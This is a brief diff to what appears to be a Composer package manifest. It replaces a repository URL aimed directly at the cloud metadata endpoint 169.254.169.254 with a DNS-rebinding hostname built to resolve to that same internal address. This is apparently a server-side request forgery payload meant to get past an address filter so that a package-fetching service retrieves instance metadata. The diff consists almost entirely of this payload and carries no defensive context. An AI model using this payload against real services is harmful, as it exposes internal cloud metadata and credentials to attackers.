@@ -2,7 +2,7 @@
  "repositories": [
   {
    "type": "vcs",
-   "url": "http://169.254.169.254/openstack/latest/meta_data.json"
+   "url": "http://k45a-set-1-ttl-make-206-189-156-69-rebind-169-254-169-254-rr.1u.ms/"
   }
  ],
  "require": {
